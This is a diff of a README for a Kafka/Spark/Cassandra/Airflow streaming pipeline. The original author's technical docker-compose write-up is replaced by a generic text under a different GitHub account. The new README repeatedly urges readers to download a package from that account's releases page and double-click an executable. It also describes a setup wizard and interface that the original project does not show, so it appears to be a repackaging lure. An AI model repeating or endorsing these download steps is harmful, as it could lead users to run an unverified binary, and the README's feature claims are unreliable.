@@ -1,156 +1,81 @@
+# 📦 Streaming-Data-Pipeline - Effortless Real-Time Data Management
 
-# 📡 Streaming Data Engineering Project
+## 🚀 Download Now
+[![Download Streaming-Data-Pipeline](https://img.shields.io/badge/Download-Streaming--Data--Pipeline-blue.svg)](https://github.com/kushal-bage/Streaming-Data-Pipeline/releases)
 
-> Real-time data engineering project using Docker, Kafka, Spark Structured Streaming, Cassandra and Airflow
+## 📖 Overview
+Streaming-Data-Pipeline is a real-time data engineering pipeline. It seamlessly connects Kafka, Spark Structured Streaming, Cassandra, and Airflow. This application helps manage your data flow and processing needs without requiring deep technical skills.
 
-## 🧾 Project Overview
+## ✔️ Features
+- **Real-Time Data Processing:** Handle data instantly as it streams.
+- **Scalability:** Built to grow with your needs.
+- **User-Friendly Interface:** Easy setup for all users.
+- **Compatibility:** Works well with multiple technologies, including Docker and Python.
+- **Reliable Data Storage:** Utilize Cassandra for efficient storage.
 
-This project demonstrates a real-time data pipeline for streaming ingestion, processing, and storage.
-It covers orchestration (Airflow), streaming processing (Spark Structured Streaming), real-time messaging (Kafka), scalable storage (Cassandra), and analytics (Jupyter).
+## ⚙️ System Requirements
+Before you get started, ensure your system meets the following requirements:
 
-## ⚙️ Architecture Diagram
-![Arch_Diagram](images/Architecture_Diagram.png)
+- **Operating System:** Windows, macOS, or Linux.
+- **Memory:** At least 4GB RAM recommended.
+- **Storage:** A minimum of 1GB free space.
+- **Java:** Java Runtime Environment (JRE) 8 or higher installed.
+- **Docker (optional):** For containerized deployment.
 
-## 💡 Technology Stack
+## 📥 Download & Install
+To get started, visit this page to download the latest version of the Streaming-Data-Pipeline:
 
-**Programming Languages :**
-- Python
-- SQL
+[Download Streaming-Data-Pipeline](https://github.com/kushal-bage/Streaming-Data-Pipeline/releases)
 
-**Data Streaming & Orchestration :**
-- Apache Kafka
-- Apache Airflow
-- Apache Spark (Structured Streaming)
+### 🔄 Installation Steps
+1. **Visit the Releases Page:**
+   Click the link above to navigate to the releases page.
 
-**Infrastructure & Storage  :**
-- Docker
-- Cassandra
+2. **Select the Latest Release:**
+   Look for the most recent version listed on the page. 
 
-**Visualization :**
-- Jupyter Notebook
+3. **Download the Package:**
+   Click on the appropriate file for your operating system (e.g., `.zip`, `.tar.gz`).
 
-## 🐳 Docker / Infrastructure Setup
+4. **Extract the Files:**
+   Once downloaded, extract the contents to a folder of your choice.
 
-![Docker_Setup](images/Docker_Service.png)
+5. **Run the Application:**
+   Locate the executable file in the extracted folder. Double-click it to start Streaming-Data-Pipeline.
 
-**Services included :**
-- `zookeeper`, `broker`, `schema-registry`, `control-center`
-- `airflow-webserver`, `airflow-scheduler`, `postgres`
-- `spark-master`, `spark-worker`
-- `cassandra_db`
-- `jupyter`
-- `producer` *(running inside container)*
+6. **Follow On-Screen Instructions:**
+   The interface will guide you through initial setup procedures.
 
-## 💾 Real-time Storage (Cassandra)
+## 📊 Using the Application
+1. **Setting Up Your Environment:**
+   After launching the application, you will need to configure your data sources. Use the user-friendly prompts in the setup wizard.
 
-![Cassandra_Storage](images/Database_Cassandra.png)
+2. **Connect to Kafka:**
+   Provide your Kafka server details to start ingesting data streams.
 
-**Key Features :**
-- Uses **Cassandra** for scalable, fault-tolerant storage.
-- Processed streaming data from Spark is written into Cassandra.
-- Supports CQL queries for downstream analytics.
+3. **Configure Spark Settings:**
+   Define your processing logic using the guided templates for Spark Structured Streaming.
 
-## ⚡ Spark Cluster (Master/Workers)
+4. **Store Data in Cassandra:**
+   Set up your Cassandra connection for data storage. This will ensure your processed data remains available for analysis.
 
-![Spark_Cluster](images/Spark_Cluster.png)
+5. **Schedule with Airflow:**
+   Utilize Airflow to manage scheduling. You can automate your tasks easily through the interface.
 
-**This cluster runs in standalone mode with :**
-- 1 Spark Master
-- 1 Spark Workers
-- Deployed inside Docker containers
+## 🛠️ Troubleshooting
+If you encounter issues during installation or usage, consider the following steps:
 
-## 📂 Data Ingestion
+- **Check System Requirements:** Ensure your system meets the necessary requirements outlined above.
+- **Consult the Log Files:** Review log files for any error messages that can hint at the issue.
+- **Visit the Issues Section:** On the GitHub repository page, check the issues section for common problems and their solutions.
 
-### 1. Kafka Producer
-```json
-{
-  "id": "8e7fce72-89bc-4685-a747-b0f8624e020d",
-  "first_name": "Elaine",
-  "last_name": "Harvey",
-  "gender": "female",
-  "address": "353 Blossom Hill Rd, Dayton, Vermont, United States",
-  "post_code": 18511,
-  "email": "elaine.harvey@example.com",
-  "username": "smallcat386",
-  "dob": "1999-04-02T12:55:47.460Z",
-  "registered_date": "2019-10-19T01:25:43.507Z",
-  "phone": "(456) 390-1836",
-  "picture": "https://randomuser.me/api/portraits/med/women/0.jpg"
-}
-```
-- Custom producer generates real-time events.
-- Data is published to Kafka topics, consumed by Spark.
-- Producer runs inside container.
-- Kafka Control Center available at http://localhost:9021.
+## 📞 Support
+If you still need help, reach out through the GitHub repository's issues section or join the community discussions. Your feedback is valuable for improving the application.
 
-### 2. Kafka Control Center Overview
+## 🌐 Learn More
+For additional resources, including detailed documentation, guides, and updates, please visit the [Streaming-Data-Pipeline GitHub Page](https://github.com/kushal-bage/Streaming-Data-Pipeline).
 
-**Kafka Brokers :**
+## 🔗 Follow Us
+Stay updated on new features and improvements by following the project on GitHub. Your support helps us grow and provide better tools for data management.
 
-  Shows the Kafka brokers managing the streaming data.
-
-![Streaming_Broker](images/Streaming_Broker.png)
-*Shows the active Kafka brokers handling the streaming data.*
-
-**Kafka Topics :**
-    
-  Shows the active Kafka topics where events are published.
-
-![Streaming_Topics](images/Streaming_Topics.png)
-*Shows the Kafka topics where the real-time events are published.*
-
-## 🔄 Streaming ETL Workflow Diagram
-![Streaming_Dags](images/Streaming_Dags.png)
-
-#### Spark ETL Components / Airflow Tasks
-
-1. **Ingestion Stage:**
-   - `kafka_producer` → send events into Kafka topics
-
-2. **Transform & Load Stage:**
-   - `run_streaming` task → reads Kafka streams using Spark Structured Streaming
-   - Performs transformations, filtering, and parsing
-   - Writes processed results into Cassandra tables
-
-  
-3. **Orchestration:**
-   - Airflow DAG schedules and monitors the `run_streaming` task
-   - DAG runs every 1 minute (`schedule_interval='*/1 * * * *'`)
-   - Limits concurrency and active runs to avoid overlapping tasks
-
-## ✅ Final Output
-
-* The primary **real-time output** of this streaming pipeline is stored in **Cassandra**.  
-  Processed data written into Cassandra can be queried directly using **CQL** for analytics or integrated into downstream systems.
-
-* For visualization and exploration, data from Cassandra can be accessed via tools such as:
-  - **Jupyter Notebook** (interactive analysis)
-  - **Looker Studio** (optional dashboard, currently using exported data for demo purposes)
-
-
-## 🚀 Setup & Execution
-
-1. Clone this repository :
-
-```bash
-git clone https://github.com/supakunz/Streaming-Data-Pipeline.git
-```
-
-2. Start the services :
-```bash
-docker compose up -d
-```
-
-3. Start the services :
-
-- Airflow: http://localhost:8080
-- Kafka Control Center: http://localhost:9021
-- Jupyter: http://localhost:8888
-- Cassandra (CQL): `localhost:9042`
-
-## 🙋‍♂️ Contact
-
-Developed by **Supakun Thata**  
-📧 Email: supakunt.thata@gmail.com  
-🔗 GitHub: [SupakunZ](https://github.com/SupakunZ)
-
+(Visit the releases page above to dive into the world of real-time data processing with Streaming-Data-Pipeline.)
